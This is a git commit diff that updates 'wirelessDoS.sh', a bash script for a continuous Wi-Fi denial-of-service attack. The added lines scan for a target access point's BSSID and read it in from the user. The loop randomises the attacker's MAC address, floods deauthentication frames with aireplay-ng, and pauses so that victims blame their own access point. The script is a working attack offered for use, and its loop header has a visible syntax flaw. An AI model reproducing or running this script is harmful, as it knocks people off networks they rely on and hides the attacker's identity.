b9b9bbb4380ceed9f69ae5c4cf7c6912d8670675
Luciano Kumaru <shinjox27@outlook.com>
2023-11-05 09:40:42 -0500

    Update wirelessDoS.sh
    updated the process into a single script

--- wirelessDoS.sh
+++ wirelessDoS.sh
@@ -5,6 +5,20 @@
 # https://www.hackers-arise.com/post/bash-scripting-for-hackers-part-2-building-a-continuous-wi-fi-denial-of-service-tool
 # Some APs will not allow this, and you will have to rewrite this script with the individual MAC addresses you want to de-authenticate.
 
+# Closes any process that could cause trouble once the wireless adapter is in monitor mode
+sudo airmon-ng check kill
+
+# identify the enemy's BSSID and copy it!
+
+airodump-ng wlan0mon
+
+# set the BSSID you wish to target
+
+echo "Enter the BSSID you wish to target... :"
+
+# sets the BSSID as a variable
+read BSSID
+
 # Creates a for loop that will execute our commands 10 times.
 for i {1..10}
 
@@ -15,7 +29,7 @@ do
 	sudo macchanger -r wlan0
  
 # Sends the deauth frames 100 times (the default is continuous) to the MAC address of the AP (-a) from the interface wlan0mon.
-	sudo aireplay-ng --deauth 100 -a InsertMacaddressOfTargetAPHere wlan0mon
+	sudo aireplay-ng --deauth 100 -a $BSSID wlan0mon
  
 # Tells the script to sleep for 60 seconds. In this way, the clients will be able to re-authenticate for 60 seconds before you send another deauth flood. 
 # Hopefully, this short interval will lead them to believe that the problem is with their AP and not you.
